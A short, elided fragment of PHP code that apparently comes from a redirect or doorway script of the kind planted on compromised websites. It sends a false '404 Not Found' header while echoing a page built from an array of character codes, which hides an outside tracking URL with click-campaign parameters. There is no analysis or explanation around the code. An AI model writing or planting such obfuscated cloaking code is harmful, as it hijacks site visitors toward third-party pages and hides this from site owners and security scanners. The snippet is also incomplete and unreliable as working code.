...
function html($data)
{
$result=implode("\r\n",array("%1"."html"."%3","%1head%3",head(),"%2head%3","%1body%3%sign%",body($data),"%2body%3","%2html%3"));
...
header("HTTP/1.1 404 Not Found");echo(html(array(104,116,116,112,58,47,47,104,105,103,104,111,107,98,114,97,105,110,46,99,111,109,47,63,97,61,52,48,49,51,51,54,38,99,61,99,112,99,38,115,61,49,57,48,50,50,48,49,55)));
?>
